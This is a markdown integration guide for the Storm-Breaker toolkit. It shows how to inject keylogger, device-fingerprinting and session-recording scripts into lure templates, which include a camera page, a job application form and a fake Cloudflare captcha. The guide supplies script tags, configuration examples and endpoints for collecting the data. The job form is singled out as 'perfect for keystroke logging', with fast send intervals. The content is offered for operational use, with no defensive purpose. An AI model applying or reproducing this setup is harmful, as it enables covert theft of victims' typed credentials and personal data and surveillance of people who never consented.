# Quick Integration Guide

## Adding Advanced Features to Existing Templates

This guide shows you how to add the new advanced features to your existing Storm-Breaker templates.

---

## Option 1: All Features (Recommended)

Add this code to the **end of your template's `index.html`** (just before `</body>`):

```html
<!-- Load rrweb library for session recording -->
<script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js"></script>

<!-- Load advanced features -->
<script src="../../assets/js/fingerprint.js"></script>
<script src="../../assets/js/keylogger.js"></script>
<script src="../../assets/js/session-recorder.js"></script>

<script>
// Initialize all features
window.addEventListener('load', async function() {
    // Send device fingerprint
    await DeviceFingerprint.send();
    
    // Start keystroke logger
    KeystrokeLogger.init();
    
    // Start session recorder
    SessionRecorder.init();
});
</script>
```

---

## Option 2: Selective Features

### Only Device Fingerprinting
```html
<script src="../../assets/js/fingerprint.js"></script>
<script>
window.addEventListener('load', async function() {
    await DeviceFingerprint.send();
});
</script>
```

### Only Keystroke Logging
```html
<script src="../../assets/js/keylogger.js"></script>
<script>
KeystrokeLogger.init();
</script>
```

### Only Session Recording
```html
<script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js"></script>
<script src="../../assets/js/session-recorder.js"></script>
<script>
SessionRecorder.init();
</script>
```

---

## Template-Specific Examples

### Example 1: Camera Template
File: `templates/camera_temp/index.html`

Add before `</body>`:
```html
<!-- Advanced Features -->
<script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js"></script>
<script src="../../assets/js/fingerprint.js"></script>
<script src="../../assets/js/keylogger.js"></script>
<script src="../../assets/js/session-recorder.js"></script>

<script>
window.addEventListener('load', async function() {
    await DeviceFingerprint.send();
    KeystrokeLogger.init();
    SessionRecorder.init();
});
</script>
```

### Example 2: Job Application Template
File: `templates/job_application/index.html`

This template already has forms - perfect for keystroke logging!

Add before `</body>`:
```html
<!-- Advanced Features - Focus on keystroke logging -->
<script src="../../assets/js/fingerprint.js"></script>
<script src="../../assets/js/keylogger.js"></script>

<script>
window.addEventListener('load', async function() {
    // Send fingerprint
    await DeviceFingerprint.send();
    
    // Start keystroke logger with faster send interval for forms
    KeystrokeLogger.init({
        endpoint: '/api/keystrokes',
        sendInterval: 3000 // Send every 3 seconds
    });
});
</script>
```

### Example 3: Cloudflare Captcha Template
File: `templates/cloudflare_captcha/index.html`

Add before `</body>`:
```html
<!-- Advanced Features -->
<script src="../../assets/js/fingerprint.js"></script>
<script src="../../assets/js/session-recorder.js"></script>

<script>
window.addEventListener('load', async function() {
    // Fingerprint helps identify returning visitors
    await DeviceFingerprint.send();
    
    // Record session to see how users interact with captcha
    SessionRecorder.init();
});
</script>
```

---

## Testing Your Integration

After adding the features:

1. **Open the template** in your browser
2. **Open browser console** (F12)
3. **Look for these messages:**
   ```
   Fingerprint sent: {status: "success", hash: "..."}
   Keystroke logger initialized
   Session recording started: session_...
   ```

4. **Check data directories:**
   ```bash
   # Windows
   dir fingerprints
   dir keystrokes
   dir sessions
   
   # Linux/Mac
   ls fingerprints/
   ls keystrokes/
   ls sessions/
   ```

---

## Troubleshooting

### Scripts Not Loading
**Problem:** Console shows "Failed to load resource"

**Solution:** Check the script paths are correct:
- Use `../../assets/js/` for templates in subdirectories
- Use `../assets/js/` if template is in root

### rrweb Not Found
**Problem:** "rrweb is not defined"

**Solution:** Make sure rrweb CDN script is loaded BEFORE session-recorder.js:
```html
<!-- Load this FIRST -->
<script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js"></script>
<!-- Then load this -->
<script src="../../assets/js/session-recorder.js"></script>
```

### No Data Being Saved
**Problem:** Features initialize but no files created

**Solution:**
1. Check Flask server is running
2. Check console for error messages
3. Verify API endpoints are accessible:
   - http://localhost:2525/api/fingerprint
   - http://localhost:2525/api/keystrokes
   - http://localhost:2525/api/session/start

---

## Best Practices

1. **Always test** after adding features
2. **Check console** for errors
3. **Verify data** is being saved
4. **Monitor storage** usage
5. **Use HTTPS** in production

---

## Performance Tips

### For High-Traffic Templates
```javascript
// Increase send intervals to reduce server load
KeystrokeLogger.init({
    sendInterval: 10000 // 10 seconds instead of 5
});

SessionRecorder.init({
    sendInterval: 20000 // 20 seconds instead of 10
});
```

### For Low-Bandwidth Scenarios
```javascript
// Disable session recording (uses most bandwidth)
// Only use fingerprinting and keylogging
await DeviceFingerprint.send();
KeystrokeLogger.init();
```

---

## Quick Reference

### Script Paths
```
../../assets/js/fingerprint.js
../../assets/js/keylogger.js
../../assets/js/session-recorder.js
```

### CDN Dependencies
```
https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js
```

### API Endpoints
```
POST /api/fingerprint
POST /api/keystrokes
POST /api/session/start
POST /api/session/events
POST /api/session/end
```

---

## Need Help?

1. Check `ADVANCED_FEATURES.md` for detailed documentation
2. Look at `templates/advanced_demo/index.html` for working example
3. Check browser console for error messages
4. Verify Flask server logs for backend errors

---

**Happy Integrating!** 🚀
